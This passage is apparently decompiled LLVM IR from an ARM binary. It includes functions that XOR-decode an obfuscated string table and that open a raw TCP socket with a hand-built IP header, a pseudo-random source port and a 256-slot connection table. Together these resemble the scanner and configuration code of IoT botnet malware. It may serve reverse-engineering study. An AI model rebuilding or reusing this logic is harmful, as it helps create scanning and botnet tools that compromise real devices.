dec_label_pc_106f8:                               ; preds = %dec_label_pc_106a4
  %v0_106f8 = load i32, i32* %r6.global-to-local, align 4
  %v1_106f8 = load i32, i32* %r5.global-to-local, align 4
  %v2_106f8 = add i32 %v1_106f8, 24
  %v3_106f8 = inttoptr i32 %v2_106f8 to i32*
  store i32 %v0_106f8, i32* %v3_106f8, align 4
  %v0_106fc = load i32, i32* %r0.global-to-local, align 4
  %v2_106fc = call i32 @function_12d7c(i32 %v0_106fc, i32 256)
  store i32 %v2_106fc, i32* %r0.global-to-local, align 4
  %v0_10700 = load i32, i32* %r5.global-to-local, align 4
  %v1_10700 = add i32 %v0_10700, 4
  %v2_10700 = inttoptr i32 %v1_10700 to i32*
  %v3_10700 = load i32, i32* %v2_10700, align 4
  store i32 %v3_10700, i32* @r4, align 4
  %v0_10708 = load i32, i32* %r6.global-to-local, align 4
  store i32 %v0_10708, i32* @r2, align 4
  store i32 %v3_10700, i32* %r0.global-to-local, align 4
  %v2_10710 = call i32 @function_135ac(i32 %v3_10700, i32 3)
  %v1_10718 = or i32 %v2_10710, 2048
  store i32 %v1_10718, i32* @r2, align 4
  %v0_1071c = load i32, i32* @r4, align 4
  store i32 %v0_1071c, i32* %r0.global-to-local, align 4
  %v2_10720 = call i32 @function_135ac(i32 %v0_1071c, i32 4)
  store i32 %v2_10720, i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1ec70.185 to i32), i32* %r3.global-to-local, align 4
  %v0_10728 = load i32, i32* %r5.global-to-local, align 4
  %v1_10728 = add i32 %v0_10728, 20
  %v2_10728 = inttoptr i32 %v1_10728 to i32*
  %v3_10728 = load i32, i32* %v2_10728, align 4
  store i32 %v3_10728, i32* @r4, align 4
  %v2_1072c = load i32, i32* @global_var_1ec70.185, align 4
  %v1_10730 = add i32 %v0_10728, 16
  %v2_10730 = inttoptr i32 %v1_10730 to i32*
  %v3_10730 = load i32, i32* %v2_10730, align 4
  store i32 %v3_10730, i32* @lr, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v2_10738 = add i32 %v0_10728, 8
  %v3_10738 = inttoptr i32 %v2_10738 to i32*
  store i32 %v2_1072c, i32* %v3_10738, align 4
  %v0_1073c = load i32, i32* %r3.global-to-local, align 4
  %v1_1073c = load i32, i32* %r5.global-to-local, align 4
  %v2_1073c = add i32 %v1_1073c, 12
  %v3_1073c = inttoptr i32 %v2_1073c to i32*
  store i32 %v0_1073c, i32* %v3_1073c, align 4
  %v0_10744 = load i32, i32* %r5.global-to-local, align 4
  %v1_10744 = add i32 %v0_10744, 4
  %v2_10744 = inttoptr i32 %v1_10744 to i32*
  %v3_10744 = load i32, i32* %v2_10744, align 4
  store i32 %v3_10744, i32* %r0.global-to-local, align 4
  %v0_10748 = load i32, i32* %r3.global-to-local, align 4
  %v2_10748 = mul i32 %v0_10748, 2
  store i32 %v2_10748, i32* %r3.global-to-local, align 4
  store i32 %v2_10748, i32* %stack_var_-32, align 4
  %v3_10768 = bitcast i32* %stack_var_-32 to %sockaddr*
  %v4_10768 = call i32 @function_13dec(i32 %v3_10744, %sockaddr* %v3_10768, i32 16)
  store i32 %v4_10768, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1076c

dec_label_pc_1076c:                               ; preds = %dec_label_pc_106a4.dec_label_pc_1076c_crit_edge, %dec_label_pc_106f8
  %v14_10770 = phi i32 [ %v14_10770.pre, %dec_label_pc_106a4.dec_label_pc_1076c_crit_edge ], [ %v4_10768, %dec_label_pc_106f8 ]
  %v2_10770 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_10770, i32* @r4, align 4
  ret i32 %v14_10770

; uselistorder directives
  uselistorder i32 %v2_10748, { 1, 0 }
  uselistorder i32 %v3_106dc, { 1, 0, 2 }
  uselistorder i32* %r5.global-to-local, { 0, 1, 2, 5, 4, 3, 6 }
  uselistorder i32* %r0.global-to-local, { 1, 0, 3, 2, 4, 8, 5, 6, 7, 9, 10 }
  uselistorder i32 (i32, i32)* @function_12d7c, { 7, 12, 16, 15, 14, 13, 11, 10, 9, 8, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_1076c, { 1, 0 }
}

define i32 @function_10778(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_10778:
  %fp.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %stack_var_-44 = alloca i32, align 4
  %v3_10778 = load i32, i32* @r4, align 4
  %v6_10778 = load i32, i32* @r5, align 4
  %v9_10778 = load i32, i32* @r6, align 4
  %v12_10778 = load i32, i32* @r7, align 4
  %v15_10778 = load i32, i32* @r8, align 4
  store i32 ptrtoint (i32* @global_var_1ec3c.187 to i32), i32* @r8, align 4
  %v2_10780 = load i32, i32* @global_var_1ec3c.187, align 4
  store i32 ptrtoint (i32* @global_var_1ec68.189 to i32), i32* %sb.global-to-local, align 4
  %v3_1078c = mul i32 %v2_10780, 16
  store i32 %v3_1078c, i32* %r3.global-to-local, align 4
  %v3_10794 = urem i32 %arg3, 65536
  store i32 %v3_10794, i32* %r2.global-to-local, align 4
  store i32 %arg1, i32* @r5, align 4
  %v2_107a0 = load i32, i32* @global_var_1ec68.189, align 4
  %v1_107a4 = add i32 %v3_1078c, 16
  store i32 %v1_107a4, i32* %r1.global-to-local, align 4
  store i32 %v3_10794, i32* %stack_var_-44, align 4
  %v8_107ac = call i32 @function_143dc(i32 %v2_107a0, i32 %v1_107a4, i32 %v3_10794, i32 %v3_1078c)
  store i32 %v8_107ac, i32* %sl.global-to-local, align 4
  %v0_107b4 = load i32, i32* @r5, align 4
  %v1_107b8 = load i32, i32* %sb.global-to-local, align 4
  %v2_107b8 = inttoptr i32 %v1_107b8 to i32*
  store i32 %v8_107ac, i32* %v2_107b8, align 4
  %v2_107bc = load i32, i32* @global_var_1ec3c.187, align 4
  store i32 %v2_107bc, i32* %fp.global-to-local, align 4
  %v1_107c0 = inttoptr i32 %v0_107b4 to i8*
  %v2_107c0 = call i32 @function_12cdc(i8* %v1_107c0)
  %sext = mul i32 %v2_107c0, 16777216
  %v1_107c4 = sdiv i32 %sext, 16777216
  %v2_107c4 = add nsw i32 %v1_107c4, 1
  store i32 %v2_107c4, i32* @r4, align 4
  store i32 %v1_107c4, i32* @r7, align 4
  %v1_107d0 = call i32 @function_14140(i32 %v2_107c4)
  %v0_107d4 = load i32, i32* @r5, align 4
  store i32 %v0_107d4, i32* %r1.global-to-local, align 4
  %v0_107d8 = load i32, i32* @r4, align 4
  store i32 %v0_107d8, i32* %r2.global-to-local, align 4
  store i32 %v1_107d0, i32* @r6, align 4
  %v3_107e0 = call i32 @function_12d58(i32 %v1_107d0, i32 %v0_107d4, i32 %v0_107d8)
  %v0_107e4 = load i32, i32* @r7, align 4
  %tmp21 = icmp slt i32 %v0_107e4, 1
  %extract.t6 = trunc i32 %v0_107e4 to i8
  br i1 %tmp21, label %dec_label_pc_10808, label %dec_label_pc_107ec

dec_label_pc_107ec:                               ; preds = %dec_label_pc_10778
  store i32 0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_107f0

dec_label_pc_107f0:                               ; preds = %dec_label_pc_107f0, %dec_label_pc_107ec
  %v2_107f8 = phi i32 [ %v1_107fc, %dec_label_pc_107f0 ], [ 0, %dec_label_pc_107ec ]
  %v1_107f0 = load i32, i32* @r6, align 4
  %v2_107f0 = add i32 %v1_107f0, %v2_107f8
  %v3_107f0 = inttoptr i32 %v2_107f0 to i8*
  %v4_107f0 = load i8, i8* %v3_107f0, align 1
  %v6_107f0 = zext i8 %v4_107f0 to i32
  %v1_107f4 = xor i32 %v6_107f0, 34
  store i32 %v1_107f4, i32* %r3.global-to-local, align 4
  %v1_107f8 = trunc i32 %v1_107f4 to i8
  store i8 %v1_107f8, i8* %v3_107f0, align 1
  %v0_107fc = load i32, i32* %r2.global-to-local, align 4
  %v1_107fc = add i32 %v0_107fc, 1
  store i32 %v1_107fc, i32* %r2.global-to-local, align 4
  %v0_10800 = load i32, i32* @r7, align 4
  %v9_10800 = icmp eq i32 %v0_10800, %v1_107fc
  br i1 %v9_10800, label %dec_label_pc_10808.loopexit, label %dec_label_pc_107f0

dec_label_pc_10808.loopexit:                      ; preds = %dec_label_pc_107f0
  %extract.t = trunc i32 %v1_107fc to i8
  br label %dec_label_pc_10808

dec_label_pc_10808:                               ; preds = %dec_label_pc_10808.loopexit, %dec_label_pc_10778
  %v0_10818.off0 = phi i8 [ %extract.t, %dec_label_pc_10808.loopexit ], [ %extract.t6, %dec_label_pc_10778 ]
  %v2_10808 = load i32, i32* @global_var_1ec3c.187, align 4
  %v2_1080c = load i32, i32* @global_var_1ec68.189, align 4
  store i32 %v2_1080c, i32* %r2.global-to-local, align 4
  %v3_10810 = mul i32 %v2_10808, 16
  %v2_10814 = add i32 %v2_1080c, %v3_10810
  store i32 %v2_10814, i32* %r3.global-to-local, align 4
  %v3_10818 = add i32 %v2_10814, 12
  %v4_10818 = inttoptr i32 %v3_10818 to i8*
  store i8 %v0_10818.off0, i8* %v4_10818, align 1
  %v0_1081c = load i32, i32* @r6, align 4
  %v1_1081c = load i32, i32* %sl.global-to-local, align 4
  %v2_1081c = load i32, i32* %fp.global-to-local, align 4
  %v5_1081c = mul i32 %v2_1081c, 16
  %v6_1081c = add i32 %v5_1081c, %v1_1081c
  %v7_1081c = inttoptr i32 %v6_1081c to i32*
  store i32 %v0_1081c, i32* %v7_1081c, align 4
  %v2_10824 = load i32, i32* @global_var_1ec3c.187, align 4
  store i32 %v2_10824, i32* @r7, align 4
  %v2_10828 = load i32, i32* @global_var_1ec68.189, align 4
  store i32 %v2_10828, i32* %sl.global-to-local, align 4
  %v1_1082c = inttoptr i32 %arg2 to i8*
  %v2_1082c = call i32 @function_12cdc(i8* %v1_1082c)
  %sext1 = mul i32 %v2_1082c, 16777216
  %v1_10830 = sdiv i32 %sext1, 16777216
  %v2_10830 = add nsw i32 %v1_10830, 1
  store i32 %v2_10830, i32* @r4, align 4
  store i32 %v1_10830, i32* @r5, align 4
  %v1_1083c = call i32 @function_14140(i32 %v2_10830)
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %v0_10844 = load i32, i32* @r4, align 4
  store i32 %v0_10844, i32* %r2.global-to-local, align 4
  store i32 %v1_1083c, i32* %r6.global-to-local, align 4
  %v3_1084c = call i32 @function_12d58(i32 %v1_1083c, i32 %arg2, i32 %v0_10844)
  %v0_10850 = load i32, i32* @r5, align 4
  %tmp22 = icmp slt i32 %v0_10850, 1
  %extract.t8 = trunc i32 %v0_10850 to i8
  br i1 %tmp22, label %dec_label_pc_10874, label %dec_label_pc_10858

dec_label_pc_10858:                               ; preds = %dec_label_pc_10808
  store i32 0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_1085c

dec_label_pc_1085c:                               ; preds = %dec_label_pc_1085c, %dec_label_pc_10858
  %v2_10864 = phi i32 [ %v1_10868, %dec_label_pc_1085c ], [ 0, %dec_label_pc_10858 ]
  %v1_1085c = load i32, i32* %r6.global-to-local, align 4
  %v2_1085c = add i32 %v1_1085c, %v2_10864
  %v3_1085c = inttoptr i32 %v2_1085c to i8*
  %v4_1085c = load i8, i8* %v3_1085c, align 1
  %v6_1085c = zext i8 %v4_1085c to i32
  %v1_10860 = xor i32 %v6_1085c, 34
  store i32 %v1_10860, i32* %r3.global-to-local, align 4
  %v1_10864 = trunc i32 %v1_10860 to i8
  store i8 %v1_10864, i8* %v3_1085c, align 1
  %v0_10868 = load i32, i32* %r2.global-to-local, align 4
  %v1_10868 = add i32 %v0_10868, 1
  store i32 %v1_10868, i32* %r2.global-to-local, align 4
  %v0_1086c = load i32, i32* @r5, align 4
  %v9_1086c = icmp eq i32 %v0_1086c, %v1_10868
  br i1 %v9_1086c, label %dec_label_pc_10874.loopexit, label %dec_label_pc_1085c

dec_label_pc_10874.loopexit:                      ; preds = %dec_label_pc_1085c
  %extract.t7 = trunc i32 %v1_10868 to i8
  br label %dec_label_pc_10874

dec_label_pc_10874:                               ; preds = %dec_label_pc_10874.loopexit, %dec_label_pc_10808
  %v0_10884.off0 = phi i8 [ %extract.t7, %dec_label_pc_10874.loopexit ], [ %extract.t8, %dec_label_pc_10808 ]
  %v2_10874 = load i32, i32* @global_var_1ec3c.187, align 4
  %v2_10878 = load i32, i32* @global_var_1ec68.189, align 4
  %v3_1087c = mul i32 %v2_10874, 16
  %v2_10880 = or i32 %v3_1087c, 13
  %v3_10884 = add i32 %v2_10880, %v2_10878
  %v4_10884 = inttoptr i32 %v3_10884 to i8*
  store i8 %v0_10884.off0, i8* %v4_10884, align 1
  %v2_1088c = load i32, i32* @global_var_1ec3c.187, align 4
  store i32 %v2_1088c, i32* %lr.global-to-local, align 4
  %v4_10890 = load i8, i8* @global_var_1ec6d.192, align 1
  %v5_10890 = zext i8 %v4_10890 to i32
  %v3_10894 = load i8, i8* bitcast (i8** @global_var_1ec6c.191 to i8*), align 4
  %v4_10894 = zext i8 %v3_10894 to i32
  %v2_10898 = load i32, i32* @global_var_1ec68.189, align 4
  %v4_1089c = mul nuw nsw i32 %v5_10890, 256
  %v5_1089c = or i32 %v4_10894, %v4_1089c
  store i32 %v5_1089c, i32* %r2.global-to-local, align 4
  %v3_108a0 = mul i32 %v2_1088c, 16
  %v2_108a4 = add i32 %v2_10898, %v3_108a0
  store i32 %v2_108a4, i32* %r1.global-to-local, align 4
  %v3_108ac = add i32 %v2_108a4, 9
  %v4_108ac = inttoptr i32 %v3_108ac to i8*
  store i8 %v4_10890, i8* %v4_108ac, align 1
  %v0_108b0 = load i32, i32* %r2.global-to-local, align 4
  %v1_108b0 = trunc i32 %v0_108b0 to i8
  %v2_108b0 = load i32, i32* %r1.global-to-local, align 4
  %v3_108b0 = add i32 %v2_108b0, 8
  %v4_108b0 = inttoptr i32 %v3_108b0 to i8*
  store i8 %v1_108b0, i8* %v4_108b0, align 1
  %v4_108b4 = load i8, i8* @global_var_1ec6d.192, align 1
  %v5_108b4 = zext i8 %v4_108b4 to i32
  %v3_108b8 = load i8, i8* bitcast (i8** @global_var_1ec6c.191 to i8*), align 4
  %v4_108b8 = zext i8 %v3_108b8 to i32
  %v4_108bc = mul nuw nsw i32 %v5_108b4, 256
  %v5_108bc = or i32 %v4_108b8, %v4_108bc
  %v2_108c0 = load i32, i32* %stack_var_-44, align 4
  %v2_108c4 = add i32 %v5_108bc, %v2_108c0
  store i32 %v2_108c4, i32* %r3.global-to-local, align 4
  %v3_108c89 = udiv i32 %v2_108c4, 256
  %v1_108cc = trunc i32 %v3_108c89 to i8
  %v2_108cc = load i32, i32* %r1.global-to-local, align 4
  %v3_108cc = add i32 %v2_108cc, 11
  %v4_108cc = inttoptr i32 %v3_108cc to i8*
  store i8 %v1_108cc, i8* %v4_108cc, align 1
  %v0_108d0 = load i32, i32* %r3.global-to-local, align 4
  %v1_108d0 = trunc i32 %v0_108d0 to i8
  %v2_108d0 = load i32, i32* %r1.global-to-local, align 4
  %v3_108d0 = add i32 %v2_108d0, 10
  %v4_108d0 = inttoptr i32 %v3_108d0 to i8*
  store i8 %v1_108d0, i8* %v4_108d0, align 1
  %v4_108d4 = load i8, i8* @global_var_1ec6d.192, align 1
  %v5_108d4 = zext i8 %v4_108d4 to i32
  %v3_108d8 = load i8, i8* bitcast (i8** @global_var_1ec6c.191 to i8*), align 4
  %v4_108d8 = zext i8 %v3_108d8 to i32
  %v4_108dc = mul nuw nsw i32 %v5_108d4, 256
  %v5_108dc = or i32 %v4_108d8, %v4_108dc
  %v2_108e0 = load i32, i32* %stack_var_-44, align 4
  %v2_108e4 = add i32 %v5_108dc, %v2_108e0
  store i32 %v2_108e4, i32* %r2.global-to-local, align 4
  %v0_108e8 = load i32, i32* @r7, align 4
  %v3_108e8 = mul i32 %v0_108e8, 16
  %v1_108ec = load i32, i32* %sl.global-to-local, align 4
  %v2_108ec = add i32 %v1_108ec, %v3_108e8
  store i32 %v2_108ec, i32* %r3.global-to-local, align 4
  %v0_108f0 = load i32, i32* %lr.global-to-local, align 4
  %v1_108f0 = add i32 %v0_108f0, 1
  store i32 %v1_108f0, i32* @lr, align 4
  %v3_108f4 = sdiv i32 %v2_108e4, 256
  store i32 %v3_108f4, i32* %r1.global-to-local, align 4
  %v0_108f8 = load i32, i32* %r6.global-to-local, align 4
  %v2_108f8 = add i32 %v2_108ec, 4
  %v3_108f8 = inttoptr i32 %v2_108f8 to i32*
  store i32 %v0_108f8, i32* %v3_108f8, align 4
  %v0_108fc = load i32, i32* @lr, align 4
  %v1_108fc = load i32, i32* @r8, align 4
  %v2_108fc = inttoptr i32 %v1_108fc to i32*
  store i32 %v0_108fc, i32* %v2_108fc, align 4
  %v0_10900 = load i32, i32* %r1.global-to-local, align 4
  %v1_10900 = trunc i32 %v0_10900 to i8
  store i8 %v1_10900, i8* @global_var_1ec6d.192, align 1
  %v0_10904 = load i32, i32* %r2.global-to-local, align 4
  %v1_10904 = trunc i32 %v0_10904 to i8
  store i8 %v1_10904, i8* bitcast (i8** @global_var_1ec6c.191 to i8*), align 4
  store i32 %v3_10778, i32* @r4, align 4
  store i32 %v6_10778, i32* @r5, align 4
  store i32 %v9_10778, i32* @r6, align 4
  store i32 %v12_10778, i32* @r7, align 4
  store i32 %v15_10778, i32* @r8, align 4
  ret i32 ptrtoint (i8** @global_var_1ec6c.191 to i32)

; uselistorder directives
  uselistorder i32 %v1_10868, { 0, 2, 3, 1 }
  uselistorder i32 %v1_1083c, { 1, 0 }
  uselistorder i32 %v1_107fc, { 0, 2, 3, 1 }
  uselistorder i32 %v1_107d0, { 1, 0 }
  uselistorder i32 %v3_10794, { 1, 2, 0 }
  uselistorder i32 %v3_1078c, { 1, 2, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 0 }
  uselistorder i32 (i8*)* @function_12cdc, { 28, 29, 8, 9, 10, 11, 12, 27, 0, 1, 2, 3, 4, 5, 6, 7, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 79, 80, 81, 82, 83, 84, 85, 86, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78 }
  uselistorder i32 (i32, i32, i32, i32)* @function_143dc, { 0, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1 }
  uselistorder i32 %arg2, { 1, 0, 2, 3 }
}

define i32 @function_1091c() local_unnamed_addr {
dec_label_pc_1091c:
  %cpsr_c.global-to-local = alloca i1, align 1
  %cpsr_z.global-to-local = alloca i1, align 1
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %tmp232 = call i32 @__decompiler_undefined_function_0()
  %tmp239 = call i32 @__decompiler_undefined_function_0()
  %tmp240 = call i8* @__decompiler_undefined_function_2()
  %tmp241 = call i32 @__decompiler_undefined_function_0()
  %tmp242 = call i8 @__decompiler_undefined_function_1()
  %stack_var_-38 = alloca i32, align 4
  %stack_var_-73 = alloca i32, align 4
  %stack_var_-84 = alloca i32, align 4
  %stack_var_-41 = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-48 = alloca i32, align 4
  %stack_var_-220 = alloca i32, align 4
  %stack_var_-64 = alloca i32, align 4
  %stack_var_-348 = alloca i32, align 4
  %stack_var_-92 = alloca i32, align 4
  %stack_var_-1842 = alloca i32, align 4
  %stack_var_-1862 = alloca i32, align 4
  %stack_var_-52 = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %v3_1091c = load i32, i32* @r4, align 4
  store i32 %v3_1091c, i32* %stack_var_-36, align 4
  %v6_1091c = load i32, i32* @r5, align 4
  %v9_1091c = load i32, i32* @r6, align 4
  %v12_1091c = load i32, i32* @r7, align 4
  %v15_1091c = load i32, i32* @r8, align 4
  %v18_1091c = load i32, i32* @sb, align 4
  %v21_1091c = load i32, i32* @sl, align 4
  %v24_1091c = load i32, i32* @fp, align 4
  %v0_10924 = call i32 @function_136c8()
  store i32 %v0_10924, i32* %r0.global-to-local, align 4
  %v7_10928 = icmp eq i32 %v0_10924, -1
  %. = zext i1 %v7_10928 to i32
  %tmp273 = icmp slt i32 %v0_10924, 1
  %storemerge229 = select i1 %tmp273, i32 %., i32 1
  store i32 %storemerge229, i32* @r4, align 4
  store i32 ptrtoint (i32* @global_var_1ecdc.183 to i32), i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_10944 = icmp eq i32 %storemerge229, 0
  store i1 %v2_10944, i1* %cpsr_z.global-to-local, align 1
  store i32 %v0_10924, i32* @global_var_1ecdc.183, align 4
  br i1 %v2_10944, label %dec_label_pc_10958, label %dec_label_pc_10950

dec_label_pc_10950:                               ; preds = %dec_label_pc_1091c
  store i32 %v3_1091c, i32* @r4, align 4
  store i32 %v6_1091c, i32* %r5.global-to-local, align 4
  store i32 %v9_1091c, i32* @r6, align 4
  store i32 %v12_1091c, i32* @r7, align 4
  store i32 %v15_1091c, i32* @r8, align 4
  store i32 %v18_1091c, i32* @sb, align 4
  store i32 %v21_1091c, i32* @sl, align 4
  store i32 %v24_1091c, i32* @fp, align 4
  ret i32 %v0_10924

dec_label_pc_10958:                               ; preds = %dec_label_pc_1091c
  %v0_10958 = call i32 @function_12f94()
  store i32 %v0_10958, i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1ecb8.86 to i32), i32* %r1.global-to-local, align 4
  store i32 %v0_10958, i32* @global_var_1ecb8.86, align 4
  %v1_10964 = call i32 @function_feb8(i32 %v0_10958)
  %v0_10968 = load i32, i32* @r4, align 4
  store i32 %v0_10968, i32* %r0.global-to-local, align 4
  %v1_1096c = inttoptr i32 %v0_10968 to i32*
  %v2_1096c = call i32 @function_1396c(i32* %v1_1096c)
  store i32 ptrtoint (i32* @global_var_1ec70.185 to i32), i32* %r2.global-to-local, align 4
  store i32 288, i32* %r1.global-to-local, align 4
  store i32 %v2_1096c, i32* @global_var_1ec70.185, align 4
  store i32 256, i32* %r0.global-to-local, align 4
  %v2_10980 = call i32 @function_14294(i32 256, i32 288)
  store i32 %v2_10980, i32* %lr.global-to-local, align 4
  %v0_1098c = load i32, i32* @r4, align 4
  store i32 %v0_1098c, i32* %stack_var_-52, align 4
  store i32 %v2_10980, i32* @global_var_1ecd4.197, align 4
  store i32 %v0_1098c, i32* %r3.global-to-local, align 4
  store i32 %v0_1098c, i32* %r5.global-to-local, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  store i32 %v0_1098c, i32* %ip.global-to-local, align 4
  %v1_109a4 = add i32 %v2_10980, 4
  store i32 %v1_109a4, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_109a8

dec_label_pc_109a8:                               ; preds = %dec_label_pc_109a8.dec_label_pc_109a8_crit_edge, %dec_label_pc_10958
  %v0_109c0 = phi i32 [ %v0_109c0.pre, %dec_label_pc_109a8.dec_label_pc_109a8_crit_edge ], [ %v0_1098c, %dec_label_pc_10958 ]
  %v0_109b0 = phi i32 [ %v0_109c8, %dec_label_pc_109a8.dec_label_pc_109a8_crit_edge ], [ %v0_1098c, %dec_label_pc_10958 ]
  %v1_109b8 = phi i32 [ %v1_109b8.pre, %dec_label_pc_109a8.dec_label_pc_109a8_crit_edge ], [ %v2_10980, %dec_label_pc_10958 ]
  %v3_109a8 = mul i32 %v0_109b0, 256
  store i32 %v3_109a8, i32* %r2.global-to-local, align 4
  %v1_109b0 = add i32 %v0_109b0, 1
  store i32 %v1_109b0, i32* %ip.global-to-local, align 4
  %v2_109b4 = mul i32 %v0_109b0, 288
  %v2_109b8 = add i32 %v1_109b8, 12
  %v2_109c0 = add i32 %v2_109b8, %v2_109b4
  %v3_109c0 = inttoptr i32 %v2_109c0 to i32*
  store i32 %v0_109c0, i32* %v3_109c0, align 4
  %v0_109c4 = load i32, i32* %r0.global-to-local, align 4
  %v1_109c4 = load i32, i32* %r1.global-to-local, align 4
  %v2_109c4 = inttoptr i32 %v1_109c4 to i32*
  store i32 %v0_109c4, i32* %v2_109c4, align 4
  %v3_109c4 = load i32, i32* %r1.global-to-local, align 4
  %v4_109c4 = add i32 %v3_109c4, 288
  store i32 %v4_109c4, i32* %r1.global-to-local, align 4
  %v0_109c8 = load i32, i32* %ip.global-to-local, align 4
  store i32 %v0_109c8, i32* %r3.global-to-local, align 4
  %v7_109cc = icmp sgt i32 %v1_109b0, 255
  br i1 %v7_109cc, label %dec_label_pc_109d0, label %dec_label_pc_109a8.dec_label_pc_109a8_crit_edge

dec_label_pc_109a8.dec_label_pc_109a8_crit_edge:  ; preds = %dec_label_pc_109a8
  %v1_109b8.pre = load i32, i32* %lr.global-to-local, align 4
  %v0_109c0.pre = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_109a8

dec_label_pc_109d0:                               ; preds = %dec_label_pc_109a8
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  store i32 2, i32* %r0.global-to-local, align 4
  store i32 3, i32* %r1.global-to-local, align 4
  store i32 6, i32* %r2.global-to-local, align 4
  store i32 %v0_109c8, i32* %stack_var_-52, align 4
  %v3_109e0 = call i32 @function_13f90(i32 2, i32 3, i32 6)
  store i32 %v3_109e0, i32* %r0.global-to-local, align 4
  %v2_109e8 = icmp eq i32 %v3_109e0, -1
  store i1 %v2_109e8, i1* %cpsr_c.global-to-local, align 1
  %v7_109e8 = icmp eq i32 %v3_109e0, -1
  store i1 %v7_109e8, i1* %cpsr_z.global-to-local, align 1
  store i32 %v3_109e0, i32* @r4, align 4
  store i32 %v3_109e0, i32* @global_var_1ecd8.199, align 4
  br i1 %v7_109e8, label %dec_label_pc_113c0, label %dec_label_pc_109f8

dec_label_pc_109f8:                               ; preds = %dec_label_pc_109d0
  store i32 3, i32* %r1.global-to-local, align 4
  %v0_109fc = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_109fc, i32* @r2, align 4
  %v2_10a00 = call i32 @function_135ac(i32 %v3_109e0, i32 3)
  store i32 4, i32* %r1.global-to-local, align 4
  %v1_10a08 = or i32 %v2_10a00, 2048
  store i32 %v1_10a08, i32* @r2, align 4
  %v0_10a0c = load i32, i32* @r4, align 4
  store i32 %v0_10a0c, i32* %r0.global-to-local, align 4
  %v2_10a10 = call i32 @function_135ac(i32 %v0_10a0c, i32 4)
  store i32 1, i32* %ip.global-to-local, align 4
  %v2_10a1c = load i32, i32* @global_var_1ecd8.199, align 4
  store i32 %v2_10a1c, i32* %r0.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v0_10a24 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_10a24, i32* %r1.global-to-local, align 4
  %v2_10a28 = ptrtoint i32* %stack_var_-52 to i32
  store i32 %v2_10a28, i32* %r3.global-to-local, align 4
  store i32 4, i32* @r4, align 4
  store i32 1, i32* %stack_var_-52, align 4
  %v6_10a38 = call i32 @function_13f60(i32 %v2_10a1c, i32 %v0_10a24, i32 3, i32* nonnull %stack_var_-52, i32 4)
  store i32 %v6_10a38, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_10a3c = icmp eq i32 %v6_10a38, 0
  store i1 %v2_10a3c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_10a3c, label %dec_label_pc_10a44, label %dec_label_pc_113b4

dec_label_pc_10a44:                               ; preds = %dec_label_pc_109f8, %dec_label_pc_10a44
  %v0_10a44 = call i32 @function_fe60()
  %v3_10a48 = mul i32 %v0_10a44, 65536
  store i32 %v3_10a48, i32* %r0.global-to-local, align 4
  %v1_10a54 = mul i32 %v0_10a44, 256
  %v3_10a58 = and i32 %v1_10a54, 65280
  %tmp276 = udiv i32 %v0_10a44, 256
  %v4_10a5c = urem i32 %tmp276, 256
  %v5_10a5c = or i32 %v4_10a5c, %v3_10a58
  store i32 %v5_10a5c, i32* %r3.global-to-local, align 4
  %v2_10a60 = icmp ugt i32 %v5_10a5c, 1023
  store i1 %v2_10a60, i1* %cpsr_c.global-to-local, align 1
  %v7_10a60 = icmp eq i32 %v5_10a5c, 1024
  store i1 %v7_10a60, i1* %cpsr_z.global-to-local, align 1
  %v3_10a64 = icmp ult i32 %v5_10a5c, 1022
  br i1 %v3_10a64, label %dec_label_pc_10a44, label %dec_label_pc_10a68

dec_label_pc_10a68:                               ; preds = %dec_label_pc_10a44
  %v5_10a50.le = trunc i32 %v0_10a44 to i8
  store i32 ptrtoint (i8** @global_var_1ec40.201 to i32), i32* %ip.global-to-local, align 4
  store i32 69, i32* %r2.global-to-local, align 4
  store i32 40, i32* %r3.global-to-local, align 4
  store i32 0, i32* @r5, align 4
